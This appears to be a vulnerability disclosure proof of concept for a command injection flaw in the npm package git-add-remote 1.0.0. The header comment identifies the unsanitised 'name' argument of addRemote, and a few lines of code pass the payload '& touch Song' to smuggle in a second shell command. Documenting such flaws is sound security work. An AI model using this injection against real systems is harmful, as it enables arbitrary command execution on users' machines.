/**
 * git-add-remote@1.0.0 is vulnerable to command injection.
 * the injection point is located in line 23 of index file("index.js") of the 
 * package in function addRemote(name, url, cb).
 * the argument "name" can be controlled by users without any sanitization.
 */

var root = require("git-add-remote")();
var payload = "& touch Song";
root(payload,'',function(){});

